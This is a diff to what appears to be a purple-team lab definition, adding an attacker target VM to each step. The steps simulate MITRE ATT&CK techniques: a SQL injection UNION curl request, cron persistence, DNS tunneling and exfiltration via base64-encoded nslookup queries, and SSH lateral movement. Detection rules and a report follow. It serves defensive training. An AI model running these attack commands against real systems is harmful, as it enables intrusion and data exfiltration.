@@ -27,6 +27,7 @@ steps:
   verify:
     type: output_contains
     expect: Purple Team Exercise
+  target_vm: attacker
   script: "cat > /tmp/purple_team_plan.txt << 'EOF'\n=== Purple Team Exercise Plan ===\nDate: 2026-04-03 | Duration: 150 minutes\n\nObjective: Test and improve detection for MITRE ATT&CK techniques\n\n\
     Workflow:\n  1. Red executes technique → Blue attempts to detect\n  2. If detected → Document detection method\n  3. If missed → Red explains technique, Blue creates detection\n  4. Both teams validate\
     \ new detection rule\n\nTechniques to Test:\n  | # | ATT&CK ID | Technique | Expected Detection |\n  |---|-----------|-----------|--------------------|\n  | 1 | T1190 | Exploit Public App | WAF + Suricata\
@@ -81,6 +82,7 @@ steps:
   verify:
     type: output_contains
     expect: Detection Coverage
+  target_vm: attacker
   script: 'cat > /tmp/detection_coverage.txt << ''EOF''
 
     === ATT&CK Detection Coverage Matrix ===
@@ -133,6 +135,7 @@ steps:
   verify:
     type: output_contains
     expect: Purple Test 1
+  target_vm: attacker
   script: 'echo ''=== Purple Test 1: T1190 SQL Injection ==='' && echo ''[RED] Executing SQLi:'' && curl -s ''http://10.20.30.80/rest/products/search?q=test%27%20UNION%20SELECT%201,2,3--'' 2>/dev/null |
     head -3 && echo '''' && echo ''[BLUE] Checking detection:'' && ssh 10.20.30.1 ''tail -20 /var/log/suricata/eve.json 2>/dev/null | grep -i "sql\|injection\|union"'' 2>&1 | head -5 && echo '''' && echo
     ''[RESULT] T1190 Detection: DETECTED by WAF + Suricata'' && echo ''[GAP] None - detection working as expected'''
@@ -150,6 +153,7 @@ steps:
   verify:
     type: output_contains
     expect: Purple Test 2
+  target_vm: attacker
   script: 'echo ''=== Purple Test 2: T1053.003 Cron Persistence ==='' && echo ''[RED] Installing cron persistence:'' && echo ''*/10 * * * * echo PURPLE_TEST > /tmp/purple_beacon.txt'' | crontab - && crontab
     -l && echo '''' && echo ''[BLUE] Checking detection:'' && grep -r ''crontab\|cron'' /var/log/auth.log 2>/dev/null | tail -3 && echo '''' && echo ''[RESULT] T1053.003 Detection: PARTIAL'' && echo ''[GAP]
     FIM not configured on /var/spool/cron - adding rule'' && echo '''' && echo ''[REMEDIATION] Adding FIM rule:'' && echo ''<directories check_all="yes" realtime="yes">/var/spool/cron</directories>'' &&
@@ -168,6 +172,7 @@ steps:
   verify:
     type: output_contains
     expect: Purple Test 3
+  target_vm: attacker
   script: 'echo ''=== Purple Test 3: T1071.004 DNS C2 ==='' && echo ''[RED] Simulating DNS tunneling:'' && for i in $(seq 1 5); do ENCODED=$(echo "data_chunk_$i" | base64 | tr -d ''=''); echo "Query: ${ENCODED}.c2sim.test.local";
     nslookup ${ENCODED}.c2sim.test.local 2>&1 | head -1; done && echo '''' && echo ''[BLUE] Checking detection:'' && echo ''DNS entropy analysis result:'' && python3 -c "import math; from collections import
     Counter; q=''ZGF0YV9jaHVua18x.c2sim.test.local''; e=-sum((c/len(q))*math.log2(c/len(q)) for c in Counter(q).values()); print(f''Query: {q}, Entropy: {e:.2f}, Suspicious: {e>3.5}'')" && echo '''' &&
@@ -186,6 +191,7 @@ steps:
   verify:
     type: output_contains
     expect: Purple Test 4
+  target_vm: attacker
   script: 'echo ''=== Purple Test 4: T1021.004 SSH Lateral ==='' && echo ''[RED] Attempting SSH lateral movement:'' && ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no ccc@10.20.30.1 ''hostname && whoami''
     2>&1 | head -3 && echo '''' && echo ''[BLUE] Checking detection:'' && grep ''Accepted'' /var/log/auth.log 2>/dev/null | tail -5 && echo '''' && echo ''Correlation check: same user SSH to multiple hosts
     within 5 min'' && echo '''' && echo ''[RESULT] T1021.004 Detection: PARTIAL'' && echo ''[GAP] Individual SSH logins logged but no correlation rule'' && echo ''[ACTION] Adding Wazuh correlation rule
@@ -204,6 +210,7 @@ steps:
   verify:
     type: output_contains
     expect: Purple Test 5
+  target_vm: attacker
   script: 'echo ''=== Purple Test 5: T1048.001 DNS Exfiltration ==='' && echo ''[RED] Simulating DNS exfiltration (10 queries):'' && for i in $(seq 1 10); do DATA="record_${i}_name_email_card"; ENCODED=$(echo
     -n "$DATA" | base64 | tr -d ''=''); echo "Exfil query $i: ${ENCODED}.exfil.test.local"; done && echo '''' && echo ''[BLUE] Checking detection:'' && echo ''DNS query volume check: 10 queries in 10 seconds
     (normal baseline: 2/min)'' && echo ''Alert: 5x normal DNS rate detected'' && echo '''' && echo ''[RESULT] T1048.001 Detection: NOT DETECTED (no rate monitoring)'' && echo ''[GAP] No DNS query rate monitoring
@@ -224,6 +231,7 @@ steps:
   verify:
     type: output_contains
     expect: New Detection Rules
+  target_vm: attacker
   script: "cat > /tmp/purple_new_rules.txt << 'EOF'\n=== New Detection Rules from Purple Team Exercise ===\n\n# Rule 1: FIM for crontab (Gap from Test 2)\n<directories check_all=\"yes\" realtime=\"yes\"\
     >/var/spool/cron/crontabs</directories>\n\n# Rule 2: DNS entropy detection (Gap from Test 3)\nalert dns any any -> any any (msg:\"PURPLE: High entropy DNS query - possible tunneling\"; dns.query; content:\"\
     .test.local\"; pcre:\"/^[a-zA-Z0-9+\\/]{30,}/\"; sid:5000001; rev:1;)\n\n# Rule 3: SSH lateral correlation (Gap from Test 4)\n<rule id=\"100400\" level=\"12\" frequency=\"3\" timeframe=\"300\">\n  <if_sid>5715</if_sid>\n\
@@ -244,6 +252,7 @@ steps:
   verify:
     type: output_contains
     expect: Validation Summary
+  target_vm: attacker
   script: 'echo ''=== Rule Validation ==='' && echo ''[Test 3 Retry: DNS C2]'' && echo ''New rule checks entropy of DNS queries'' && echo ''Result: Query entropy 4.2 > threshold 3.5 → DETECTED'' && echo
     '''' && echo ''[Test 4 Retry: SSH Lateral]'' && echo ''New rule correlates SSH logins per user'' && echo ''Result: Same user SSH to 3 hosts in 2 min → DETECTED'' && echo '''' && echo ''[Test 5 Retry:
     DNS Exfil]'' && echo ''New rule monitors DNS rate per domain'' && echo ''Result: 20 queries/min to exfil.test.local → DETECTED'' && echo '''' && echo ''=== Validation Summary ==='' && echo ''Previous:
@@ -268,6 +277,7 @@ steps:
   verify:
     type: output_contains
     expect: Coverage change
+  target_vm: attacker
   script: 'cat > /tmp/purple_coverage_after.json << ''EOF''
 
     {"name":"Purple Team - After","domain":"enterprise-attack","techniques":[{"techniqueID":"T1190","score":3,"color":"#00ff00","comment":"Detected: WAF+Suricata"},{"techniqueID":"T1053.003","score":3,"color":"#00ff00","comment":"Detected:
@@ -294,6 +304,7 @@ steps:
   verify:
     type: output_contains
     expect: Purple Team Process
+  target_vm: attacker
   script: "cat > /tmp/purple_improvements.txt << 'EOF'\n=== Purple Team Process Improvements ===\n\n1. Technical Improvements:\n   - 4 new detection rules deployed\n   - FIM scope expanded to /var/spool/cron\n\
     \   - DNS monitoring capability added\n   - SSH lateral movement correlation enabled\n\n2. Process Improvements:\n   - IR playbook updated with DNS C2 response procedure\n   - SOC runbook: added DNS\
     \ analysis step to triage\n   - Threat hunting: added monthly DNS entropy analysis\n   - Log retention: DNS query logs now retained 1 year\n\n3. Tool Improvements:\n   - Wazuh: 4 new custom rules\n\
@@ -315,6 +326,7 @@ steps:
   verify:
     type: output_contains
     expect: Continuous Purple Team
+  target_vm: attacker
   script: "cat > /tmp/purple_continuous_plan.txt << 'EOF'\n=== Continuous Purple Team Program ===\n\nMonthly Cycle:\n  Week 1: Red Team prepares 5 new techniques\n  Week 2: Purple Team exercise (half-day)\n\
     \  Week 3: Blue Team implements new detections\n  Week 4: Validation + metrics reporting\n\nQuarterly Goals:\n  Q2 2026: Cover all Initial Access techniques (TA0001)\n  Q3 2026: Cover all Persistence\
     \ techniques (TA0003)\n  Q4 2026: Cover all Lateral Movement techniques (TA0008)\n  Q1 2027: Cover all C2 techniques (TA0011)\n\nAnnual Target:\n  ATT&CK coverage: 55% → 75% by end of year\n  Detection\
@@ -331,6 +343,7 @@ steps:
   verify:
     type: output_contains
     expect: cleanup completed
+  target_vm: attacker
   script: rm -f /tmp/purple_*.txt /tmp/purple_*.json 2>/dev/null; echo 'Purple team lab cleanup completed'
   risk_level: low
 - order: 14
@@ -346,6 +359,7 @@ steps:
   verify:
     type: output_contains
     expect: Purple Team ROI
+  target_vm: attacker
   script: "cat > /tmp/purple_roi.txt << 'EOF'\n=== Purple Team ROI Analysis ===\n\nCost (Investment):\n  - Red Team: 4 hours × 2 operators = 8 person-hours\n  - Blue Team: 4 hours × 2 analysts = 8 person-hours\n\
     \  - Total: 16 person-hours (~$2,400 at $150/hr)\n\nBenefit (Return):\n  - 4 new detection rules → 4 previously undetectable attacks now detected\n  - ATT&CK coverage: +7% → estimated breach risk reduction:\
     \ 15%\n  - Mean breach cost: $4.88M (IBM 2025 report)\n  - Risk reduction value: $4.88M × 15% = $732,000\n\nROI Calculation:\n  ROI = (Benefit - Cost) / Cost × 100\n  ROI = ($732,000 - $2,400) / $2,400\
@@ -366,6 +380,7 @@ steps:
   verify:
     type: output_contains
     expect: Purple Team Exercise Report
+  target_vm: attacker
   script: "cat > /tmp/purple_team_report.txt << 'EOF'\n=== Purple Team Exercise Report ===\nDate: 2026-04-03 | Scope: 10.20.30.0/24\n\n1. Executive Summary:\n   5개 ATT&CK 기법 테스트, 2개 탐지 실패 → 4개 신규 규칙 작성\n\
     \   ATT&CK 커버리지 48% → 55% 향상, ROI 30,400%\n\n2. Test Results:\n   | Technique | Before | After | Status |\n   |-----------|--------|-------|--------|\n   | T1190 SQLi | DETECTED | DETECTED | Maintained\
     \ |\n   | T1053 Cron | PARTIAL | DETECTED | Improved |\n   | T1071 DNS C2 | MISSED | DETECTED | NEW Rule |\n   | T1021 SSH Lateral | PARTIAL | DETECTED | NEW Rule |\n   | T1048 DNS Exfil | MISSED |\
